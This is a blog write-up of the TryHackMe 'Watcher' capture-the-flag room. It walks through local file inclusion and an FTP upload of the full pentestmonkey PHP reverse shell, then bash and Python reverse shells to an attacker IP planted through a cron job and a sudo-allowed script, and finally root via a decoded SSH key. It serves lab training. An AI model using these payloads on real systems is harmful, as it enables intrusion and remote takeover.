---
layout: post
author: Razor
title: "Tryhackme Watcher"
categories: [Tryhackme, Linux]
tags: [boot2root, lfi, medium-box, privilage escalation,web exploitation, enumeration]     # TAG names should always be lowercase
image: assets/thm_watcher/bg.png
toc: true
---

## Introduction
This is partical room from tryhackme entitled "Watcher" with Medium difficulty. In this room we will learn about File Inclusion, LFI to RCE, Getting privilage from cronjob, and Python library injection. In this room we will doing lfi and getting any credential then exploit the box. Link room [here](https://tryhackme.com/room/watcher)

## Scanning

### Nmap 

First time we have to do is scanning the Machine :
```bash
nmap 10.10.35.205 -sC -sV
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-20 23:42 WIB
Nmap scan report for 10.10.35.205
Host is up (0.34s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e1:80:ec:1f:26:9e:32:eb:27:3f:26:ac:d2:37:ba:96 (RSA)
|   256 36:ff:70:11:05:8e:d4:50:7a:29:91:58:75:ac:2e:76 (ECDSA)
|_  256 48:d2:3e:45:da:0c:f0:f6:65:4e:f9:78:97:37:aa:8a (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Jekyll v4.1.1
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Corkplacemats
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.71 seconds


```

From the results of nmap we know there are 3 open ports including ftp, ssh, and webserver. Now let's take a look the webserver :
![img](/assets/thm_watcher/bg_1.png)

## Getting User

First i'm going to robots.txt, and i found this : 

![img](/assets/thm_watcher/bg_2.png)

Now lets looking at flag_1.txt. 

### Flag 1

![img](/assets/thm_watcher/bg_3.png)

Then we got first flag. now lets see the content of the webserver.

![img](/assets/thm_watcher/bg_4.png)

As you can see there is maybe php runs a script which displays a file. and i trying File Inclusion then change striped.php to `/etc/passwd`. From `http://10.10.35.205/post.php?post=striped.php` to `http://10.10.35.205/post.php?post=/etc/passwd`.

![img](/assets/thm_watcher/bg_5.png)

Then its works!!. Now lets see the secret file `/secret_file_do_not_read.txt` in `http://10.10.35.205/post.php?post=/secret_file_do_not_read.txt`.

![img](/assets/thm_watcher/bg_6.png)

And We found credentials of the ftp!, let's check the ftp user .

![img](/assets/thm_watcher/bg_7.png)

### Flag 2

As you can see we found flag_2.txt and get it.
```
$ cat flag_2.txt              
FLAG{f------------e}
```
Now as you can see in ftp there is have files which is can be uploaded. then i want try to upload php-revershell.php from pentest monkey which contain : 
```bat
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.2.47.251';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
        // Fork and have the parent process exit
        $pid = pcntl_fork();

        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }

        if ($pid) {
                exit(0);  // Parent exits
        }

        // Make the current process a session leader
        // Will only succeed if we forked
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }

        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
        // Check for end of TCP connection
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }

        // Check for end of STDOUT
        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }

        // Wait until a command is end down $sock, or some
        // command output is available on STDOUT or STDERR
        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        // If we can read from the TCP socket, send
        // data to process's STDIN
        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }

        // If we can read from the process's STDOUT
        // send data down tcp connection
        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }

        // If we can read from the process's STDERR
        // send data down tcp connection
        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}

?> 

```
Let's Upload : 

![img](/assets/thm_watcher/bg_8.png)

After doing that you must set netcat `nc -lvnp 4444` for shell and we can go to file upload in `http://10.10.35.205/post.php?post=../../../../../home/ftpuser/ftp/files/php-reverse-shell.php`.

![img](/assets/thm_watcher/bg_9.png)

So now we have shell of webserver, then we get flag_3.txt.

### Flag 3

```
www-data@watcher:$ cd /var/www/html/more_secrets_a9f10a
www-data@watcher:/var/www/html/more_secrets_a9f10a$ ls
flag_3.txt
www-data@watcher:/var/www/html/more_secrets_a9f10a$ cat flag_3.txt
cat flag_3.txt
FLAG{l------------y}
```
Then i'm check the privilage with sudo -l and here is the output:

```bash 
sudo -l
Matching Defaults entries for www-data on watcher:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on watcher:
    (toby) NOPASSWD: ALL
```
That you can see, the user www can access user toby and we can change user without using password with this command `sudo -u toby bash`.

![img](/assets/thm_watcher/bg_10.png)

### Flag 4

And there is also have flag_4.txt

```
toby@watcher:~$ cat flag_4.txt                                                         
cat flag_4.txt                                                                   
FLAG{c------------e}
```
After that we can echo shell to cow.sh, i know it because there is have note.txt and explain the user of mat create cronjob with permision of mat. Now we can put revershell to cow.sh `echo "bash -i >& /dev/tcp/10.2.47.251/1234 0>&1" >> cow.sh`

Note.txt : 
```
Hi Toby,

I've got the cron jobs set up now so don't worry about getting that done.

Mat
```
![img](/assets/thm_watcher/bg_11.png)

### Flag 5

Now we got the shell of user mat from the cronjob and also the flag_5.txt
```
mat@watcher:~$ cat flag_5.txt
cat flag_5.txt
FLAG{li--------------------------ow}
```
the user can access script python : 
```
mat@watcher:~$ sudo -l
sudo -l
Matching Defaults entries for mat on watcher:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mat may run the following commands on watcher:
    (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
```

Then there is have some text is note.txt : 
```
Hi Mat,

I've set up your sudo rights to use the python script as my user. You can only run the script with sudo so it should be safe.

Will
```
Now we can change the script and doing Python Library injection with this command : 

```bash
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.2.47.251",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
![img](/assets/thm_watcher/bg_12.png)

### Flag 6

Then run this with user will without using any password. `sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py *`

![img](/assets/thm_watcher/bg_13.png)


Boom! we got the user `will` also the flag_6.txt ofcourse :D

```
$ cat flag_6.txt
FLAG{but_i_thought_my_script_was_secure}
```
## Privilage Escalation

After looking around i found `/opt/backups/key.bs64` and this is base64 encoded

![img](/assets/thm_watcher/bg_14.png)

We can decode it :

![img](/assets/thm_watcher/bg_15.png)

### Last Flag

Then there is id_rsa key. we can access root now with the key we found.

![img](/assets/thm_watcher/bg_16.png)

Boom we are root now and having a the last of flag.

```
root@watcher:~# cat flag_7.txt 
FLAG{wh--------------------rs}
```

so that's all the writeup that I made now we have 7 flags, including root flag.
Take care and Happy hacking :D